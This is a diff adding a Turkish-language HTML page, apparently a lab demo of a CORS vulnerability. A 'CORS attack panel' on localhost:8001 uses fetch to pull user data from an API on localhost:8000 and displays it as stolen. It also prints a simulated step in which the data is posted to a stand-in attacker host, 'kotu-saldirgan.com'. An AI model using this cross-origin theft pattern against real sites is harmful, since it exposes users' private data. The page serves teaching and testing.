@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Farklı Domain Saldırı Sayfası</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            padding-top: 2rem;
+        }
+        .hacker-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #212529;
+            color: #00ff00;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            font-family: 'Courier New', monospace;
+        }
+        .card {
+            margin-top: 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #333;
+            color: #00ff00;
+        }
+        .btn-hacker {
+            background-color: #00ff00;
+            color: #212529;
+            font-weight: bold;
+            border: none;
+            transition: all 0.3s;
+        }
+        .btn-hacker:hover {
+            background-color: #212529;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+        pre {
+            background-color: #333;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .hidden {
+            display: none;
+        }
+        .console-output {
+            background-color: #000;
+            border: 1px solid #00ff00;
+            padding: 1rem;
+            border-radius: 5px;
+            margin-top: 1rem;
+        }
+        .blink {
+            animation: blinker 1s linear infinite;
+        }
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hacker-container">
+            <h1 class="mb-4 text-center blink">CORS Saldırı Paneli</h1>
+            
+            <p>> Bu sayfa farklı bir domaindir (localhost:8001) ve CORS açığını kullanarak başka bir domaindeki (localhost:8000) API'ye istek atmayı simüle eder.</p>
+            <p>> Saldırı hazır...</p>
+            <div class="console-output">
+                <div id="console-text">$ _</div>
+            </div>
+            
+            <div class="row mt-4">
+                <div class="col-md-6">
+                    <div class="card p-3">
+                        <h4>Kullanıcı Verileri Çalma</h4>
+                        <p>localhost:8000 üzerindeki hassas kullanıcı verilerini çeker.</p>
+                        <button id="steal-data-btn" class="btn btn-hacker">Saldırıyı Başlat</button>
+                    </div>
+                </div>
+                
+            </div>
+            
+            <div id="result-container" class="mt-4 hidden">
+                <h3>Çalınan Veriler:</h3>
+                <pre id="stolen-data">Veri henüz çalınmadı...</pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap ve gerekli scriptler -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const consoleText = document.getElementById('console-text');
+            const resultContainer = document.getElementById('result-container');
+            const stolenData = document.getElementById('stolen-data');
+            
+            function addConsoleText(text) {
+                consoleText.innerHTML += '<br>$ ' + text;
+            }
+            
+            // Normal saldırı - kullanıcı 1 verilerini çalma
+            document.getElementById('steal-data-btn').addEventListener('click', function() {
+                resultContainer.classList.remove('hidden');
+                stolenData.textContent = 'Saldırı başlatılıyor...';
+                addConsoleText('curl http://localhost:8000/api/user_data.php?user_id=1');
+                
+                fetch('http://localhost:8000/api/user_data.php?user_id=1')
+                    .then(response => response.json())
+                    .then(data => {
+                        addConsoleText('Veri başarıyla çalındı!');
+                        stolenData.textContent = JSON.stringify(data, null, 2);
+                        
+                        // Simüle edilmiş veri hırsızlığı
+                        addConsoleText('echo "Çalınan veri saldırganın sunucusuna gönderiliyor..."');
+                        setTimeout(() => {
+                            addConsoleText('POST https://kotu-saldirgan.com/stolen-data');
+                            addConsoleText('HTTP/1.1 200 OK');
+                        }, 1000);
+                    })
+                    .catch(error => {
+                        addConsoleText('HATA: ' + error.message);
+                        stolenData.textContent = 'Saldırı başarısız oldu: ' + error.message;
+                    });
+            });
+            
+            
+        });
+    </script>
+</body>
+</html>
